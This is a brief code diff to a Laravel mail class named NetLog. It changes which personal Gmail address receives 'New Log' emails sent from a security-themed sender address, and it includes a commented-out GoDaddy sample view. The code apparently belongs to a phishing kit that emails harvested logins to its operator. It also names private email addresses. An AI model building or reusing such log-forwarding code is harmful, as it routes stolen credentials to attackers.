@@ -35,7 +35,7 @@ class NetLog extends Mailable
     {
         return $this->subject('New Log')
         ->from('security@mail-guard.services', 'New Log')
-        ->to('talktojimmykimmel@gmail.com')
+        ->to('engr.raheemben@gmail.com')
         ->view('email.net');
         // ->view('godaddy.sample');
     }
